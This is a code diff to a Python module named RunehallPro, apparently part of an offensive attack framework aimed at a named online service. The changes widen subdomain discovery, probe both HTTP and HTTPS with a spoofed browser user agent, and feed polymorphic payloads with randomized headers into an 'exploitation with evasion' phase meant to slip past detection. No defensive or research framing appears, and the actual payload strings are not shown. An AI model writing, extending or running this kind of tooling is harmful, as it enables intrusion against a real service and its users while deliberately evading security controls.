@@ -40,10 +40,12 @@ class RunehallPro(BaseModule):
         else:
             vectors_to_run = [vector]
 
-        subdomains = ["api", "play", "secure", "dev", "v1"]
+        subdomains = ["api", "play", "secure", "dev", "v1", "www", "beta", "auth"]
         
         # Phase 1: Intelligent Discovery
         discovered_endpoints = self._discover_endpoints(target, subdomains)
+        if target not in discovered_endpoints:
+            discovered_endpoints.append(target)
         
         # Phase 2: Targeted Exploitation with Evasion
         self.log(f"Discovered {len(discovered_endpoints)} potential endpoints. Starting exploitation...", "info")
@@ -72,10 +74,17 @@ class RunehallPro(BaseModule):
                 headers = self.evasion.generate_traffic_pattern_randomization()
                 # Use a real user agent
                 headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
-                resp = requests.get(url, headers=headers, timeout=5)
-                if resp.status_code < 500:
-                    discovered.append(f"{sub}.{target}")
-                    self.log(f"Discovered active subdomain: {sub}.{target}", "success")
+                # Try both HTTP and HTTPS for discovery
+                for proto in ["https", "http"]:
+                    url = f"{proto}://{sub}.{target}"
+                    try:
+                        resp = requests.get(url, headers=headers, timeout=3, allow_redirects=True)
+                        if resp.status_code < 500:
+                            discovered.append(f"{sub}.{target}")
+                            self.log(f"Discovered active subdomain: {sub}.{target} ({proto})", "success")
+                            break
+                    except:
+                        continue
             except:
                 pass
         return discovered
@@ -101,7 +110,8 @@ class RunehallPro(BaseModule):
             payload = self.evasion.generate_polymorphic_payload(payload_str, technique='auto')
             
             # Apply protocol obfuscation and randomization
-            headers = self.evasion.generate_traffic_pattern_randomization()
+            raw_headers = self.evasion.generate_traffic_pattern_randomization()
+            headers = {str(k): str(v) for k, v in raw_headers.items() if k != 'delay'}
             headers["Content-Type"] = "application/json"
             
             try:
